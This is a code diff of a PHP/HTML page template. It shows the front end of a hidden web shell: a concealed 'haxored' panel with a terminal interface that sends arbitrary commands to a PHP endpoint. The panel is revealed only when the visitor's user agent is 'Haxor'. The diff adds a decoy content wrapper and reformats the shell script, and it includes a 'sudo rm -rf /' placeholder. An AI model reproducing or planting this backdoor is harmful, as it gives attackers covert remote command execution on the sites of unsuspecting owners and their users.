@@ -65,7 +65,13 @@
 ?>
 <?php else: ?>
 
+<div id="luserContent">
+<%= $page %>
+</div>
+
+
 <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+
 <div id="haxored" hidden="true">
 
 <style rel="stylesheet" type="text/css">
@@ -112,31 +118,9 @@
 	float: right;
 	padding: 12px 10px;
 	margin-right: 30px;
-	/* display: inline; */
 }
-
-/*
-#XsideBar {
-
-	float: right;
-	width: 12%;
-	height: 100%;
-	clear: right;
-	padding: 20px 0;
-	margin: 0;
-	display: inline;
-	background-color: #2d2d2d;
-	color: #fff;
-}
-
-#XsideBar ul li {
-	list-style-type: none;
-}
-*/
 
 #XmainShell {
-	/*float: center;
-	 clear: left; */
 	height: 90%;
 	padding: 20px 0px;
 	margin: 0px;
@@ -145,10 +129,6 @@
 	width: 100%;
 }
 
-#XoutputShell {
-	float: top;
-	height: 100%;
-}
 #XinputShell {
 	margin-left: 3%;
 	margin-right: 3%;
@@ -201,8 +181,6 @@
 	padding-bottom:40px;
 }
 
-
-
 </style>
 <div id="Xcontainer">
 	<div id="XmenuNav">
@@ -223,15 +201,6 @@
 	<br>
 	</div>
 	<div id="XmainContainer">
-<!--	
-	<div id="XsideBar">
-			<ul>
-				<li id="XPHPversion">Something here?</li>
-				<li>or here</li>
-				<li>or here</li>
-			</ul>
-		</div>
-!-->
 		<div id="XmainShell">
 			<div id="XShellContainer">
 				<div id="XShellOutput">
@@ -241,91 +210,89 @@
 				<input type="text" placeholder="sudo rm -rf /" id="shellInput">
 			</div>
 		</div>
-		<script type="text/javascript">
-$(document).ready( function() {
+	
+	<script type="text/javascript">	
+		$(document).ready( function() {
 
-	var history = [];
-	var counter = 0;
+			var history = [];
+			var counter = 0;
 
-	function submit(command) {
-		history.push(command);
-		$.ajax({
-		url: "<?php echo $connectstr; ?>",
-			type: "GET",
-			data: {"shellCommand": command},
-			success: function(data) {
-				renderCmd(command, data)
+			function submit(command) {
+				history.push(command);
+				$.ajax({
+					url: "<?php echo $connectstr; ?>",
+					type: "GET",
+					data: {"shellCommand": command},
+					success: function(data) {
+					renderCmd(command, data)
+				}
+			});
+		}
+
+		var user = "badass";
+		var hostname = "microserver";
+
+		function renderCmd(command, output) {
+			var time = new Date().toLocaleTimeString('en-GB', { hour: "numeric", minute: "numeric"});
+			$("#XShellOutput").append("<pre class='command'>" + time + " "+ user + "@" + hostname + " $ " + command + "</pre>");
+			$("#XShellOutput").append("<pre class='output'>" + output + "</pre>");
+			$("#XShellOutput").scrollTop($("#XShellOutput")[0].scrollHeight);
+		}
+	
+		var request = "";
+
+	
+		$("#XbuttonPwd").on('click', function(e) {
+			e.preventDefault();
+			request = "pwd";
+			submit(request);
+		});
+
+		$("#XbuttonPerm").on('click', function(e) {
+			e.preventDefault();
+			request = "perm";
+			submit(request);
+		});
+
+		$("#XbuttonPs").on('click', function(e) {
+			e.preventDefault();
+			request = "ps";
+			submit(request);
+		});
+
+
+		$("#XbuttonIfconfig").on('click', function(e) {
+			e.preventDefault();
+			request = "ifconfig";
+			submit(request);
+		});
+
+		var inputshell = document.getElementById("XinputShell");
+		inputshell.addEventListener("keydown", function(e) {
+			if (e.which == 13) {
+				submit($("#shellInput").val());
+				$("#shellInput").val("");
+			}
+		
+			if (e.which == 38 && counter < history.length) {
+				counter += 1;
+			
+				$("#shellInput").val(history[history.length - counter]);
+			}
+
+			if (e.which == 40 && counter > 0) {
+				counter -= 1;
+				$("#shellInput").val(history[history.length - counter]);
+			}
+
+			if (e.keyCode == 90 && e.ctrlKey) {
+				$("#XShellOutput").empty();
 			}
 		});
-	}
 
-	var user = "badass";
-	var hostname = "microserver";
-
-	function renderCmd(command, output) {
-		var time = new Date().toLocaleTimeString('en-GB', { hour: "numeric", minute: "numeric"});
-		$("#XShellOutput").append("<pre class='command'>" + time + " "+ user + "@" + hostname + " $ " + command + "</pre>");
-		$("#XShellOutput").append("<pre class='output'>" + output + "</pre>");
-		$("#XShellOutput").scrollTop($("#XShellOutput")[0].scrollHeight);
-	}
-	
-	var request = "";
-
-	
-	$("#XbuttonPwd").on('click', function(e) {
-		e.preventDefault();
-		request = "pwd";
-		submit(request);
+		$("#XPHPversion").text("<?php echo 'Current PHP Version: ' . phpversion(); ?>");
 	});
 
-	$("#XbuttonPerm").on('click', function(e) {
-		e.preventDefault();
-		request = "perm";
-		submit(request);
-	});
-
-	$("#XbuttonPs").on('click', function(e) {
-		e.preventDefault();
-		request = "ps";
-		submit(request);
-	});
-
-
-	$("#XbuttonIfconfig").on('click', function(e) {
-		e.preventDefault();
-		request = "ifconfig";
-		submit(request);
-	});
-
-	var inputshell = document.getElementById("XinputShell");
-	inputshell.addEventListener("keydown", function(e) {
-		if (e.which == 13) {
-			submit($("#shellInput").val());
-			$("#shellInput").val("");
-		}
-		
-		if (e.which == 38 && counter < history.length) {
-			counter += 1;
-			
-			$("#shellInput").val(history[history.length - counter]);
-		}
-
-		if (e.which == 40 && counter > 0) {
-			counter -= 1;
-			$("#shellInput").val(history[history.length - counter]);
-		}
-
-		if (e.keyCode == 90 && e.ctrlKey) {
-			$("#XShellOutput").empty();
-		}
-	});
-
-	$("#XPHPversion").text("<?php echo 'Current PHP Version: ' . phpversion(); ?>");
-});
-</script>
-</div>
-
-<script type="text/javascript">
 	$(document).ready(function() {
 		if(navigator.userAgent == "Haxor") {
 			console.log("Hello Master.")
@@ -338,6 +305,7 @@ $(document).ready( function() {
 		}
 	});
 </script>
+</div>
 <!-- Below here should be the closing </body> tag -->
 <?php endif; ?>
 
